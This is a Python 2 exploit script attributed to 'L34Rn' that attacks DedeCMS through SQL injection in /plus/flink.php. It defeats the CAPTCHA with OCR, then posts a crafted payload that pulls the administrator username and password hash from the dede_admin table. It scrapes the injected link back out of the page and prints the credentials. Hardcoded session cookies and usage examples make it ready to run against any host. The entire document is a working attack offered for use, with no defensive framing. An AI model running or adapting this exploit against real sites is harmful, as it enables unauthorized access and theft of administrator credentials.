#coding=utf-8

'''
cms:    dedecms
path:   /plus/flink.php 
type:   SQLi 
auth:   L34Rn
'''

import sys
import os
import re
from urllib2 import urlopen
from urllib2 import Request
from pytesser import getCheckCode

codeFile="code.jpg"
checkCodeBaseUrl="/include/vdimgck.php"
baseUrl = "/plus/flink.php"
shellcode="Submit=%20%E6%8F%90%20%E4%BA%A4%20&dopost=save&email=&logo=,if(@`'`,0x7c,(select concat(userid,0x7c,pwd) from dede_admin limit 0,1)),1,1,1,1,1)#,@`'`&typeid=1&url=http%3A%2F%2F&ischeck=1&_FILES[webname][name]=1.gif&_FILES[webname][type]=image/gifx&_FILES[webname][size]=10&&_FILES[webname][tmp_name]=pass\&validate="
headers={
    "Content-Type":"application/x-www-form-urlencoded",
    "Cookie":"PHPSESSID=4bncpf8cudfmnquxxdcpkrb12s97; DedeUserID=1; DedeUserID__ckMd5=3e8e80104cbfad5d; DedeLoginTime=1397994952; DedeLoginTime__ckMd5=faedace47fa2ac95"
}

def downloadCheckCode(url,headers):
    '''
    get check code image
    '''
    with open(codeFile,"wb") as f:
        try:
            req = Request(url,headers=headers)
            res = urlopen(req)
            f.write(res.read())
            return True
        except Exception,e:
            print "[+] Error:",str(e)
            return False


def postShellcode(url,shellcode,headers):
    '''
    post shellcode
    '''
    try:
        req=Request(url,data=shellcode,headers=headers)
        res=urlopen(req)
        print "[+] Response Length:",len(res.read())
        return True
    except Exception,e:
        print "[+] ",str(e)
        return False

def checkResult(url):
    '''
    check attack result!
    '''
    res = urlopen(url)
    rex=re.search(r"<a href='http://' target='_blank'><img src='(\w+\|\w{20})' width='88' height='31' border='0' alt='pass','>",res.read())
    if rex == None:
        return False
    else:
        return rex.group(1).split("|")

def usage():
    print '[+] usage: exp.py <host> [port] [cmsPath]'
    print '[+] example1: exp.py [url=http://www.xxoo.com]www.xxoo.com[/url]'
    print '[+] example2: exp.py [url=http://www.xxoo.com]www.xxoo.com[/url] 8080'
    print '[+] example3: exp.py [url=http://www.xxoo.com]www.xxoo.com[/url] 8080 /dedecms'

def main():
    global shellcode
    port = '80'
    path = ''
    if len(sys.argv) < 2:
        usage()
        exit()
    elif len(sys.argv) == 2:
        host=sys.argv[1]
    elif len(sys.argv) == 3:
        host=sys.argv[1]
        port=sys.argv[2]
    elif len(sys.argv) == 4:
        host=sys.argv[1]
        port=sys.argv[2]
        path=sys.argv[3]
    else:
        usage()
        exit()
    formatUrl="http://"+host+":"+port+path
    url=formatUrl+baseUrl
    print "[+] attack start ok!"
    print "[+] url:",url
    checkCodeUrl=formatUrl+checkCodeBaseUrl
    checkResultUrl=formatUrl+baseUrl
    print "[+] download check code now ..."
    tof = downloadCheckCode(checkCodeUrl,headers)
    if tof == False:
        print "[+] download check code Error!"
        print "[+] jsut try again!"
        exit()
    else:
        print "[+] download check code ok!"
    print "[+] image to code now ..."
    code = getCheckCode(codeFile)
    if code == False:
        print "[+] image to code Error!"
        print "[+] just try again!"
        exit()
    else:
        print "[+] image to code ok!"
        print "[+] check code is:",code
    shellcode+=code
    print "[+] post shellcode now ..."
    tof = postShellcode(url,shellcode,headers)
    if tof == False:
        print "[+] post shellcode Error!"
        exit()
    else:
        print "[+] shellcode post ok!"
    print "[+] check Result now ..."
    res = checkResult(checkResultUrl)
    if res == False:
        print "[+] attack Complete,but Failed!"
    else:
        print "[+] attack Complete!"
        print "[+] username:",res[0]
        print "[+] password:",res[-1][3:-1]


if __name__ == "__main__":
    try:
        main()
    except Exception,e:
        print "[+] Error: ",str(e)